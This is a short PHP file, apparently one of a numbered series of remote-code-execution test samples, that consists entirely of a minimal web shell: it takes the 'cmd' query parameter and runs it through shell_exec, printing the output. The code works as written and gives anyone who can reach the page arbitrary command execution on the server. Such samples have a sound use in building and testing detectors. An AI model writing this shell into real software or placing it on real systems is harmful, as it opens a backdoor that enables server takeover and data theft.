<?php
// RCE test variation #586
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>